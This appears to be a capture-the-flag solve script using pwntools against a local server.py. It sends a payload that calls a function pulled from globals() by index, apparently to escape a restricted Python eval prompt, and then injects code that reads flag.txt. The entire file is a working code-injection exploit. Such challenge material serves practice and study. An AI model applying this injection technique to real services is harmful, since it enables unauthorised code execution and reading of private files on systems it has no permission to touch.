from pwn import *

conn = process(["python", "server.py"])
payload1 = "globals()[list(globals())[9]]()"
conn.sendlineafter(b"> ", payload1.encode())
payload2 = 'print(open("flag.txt").read())'
conn.sendlineafter(b"> ", payload2.encode())
print(conn.recvline())
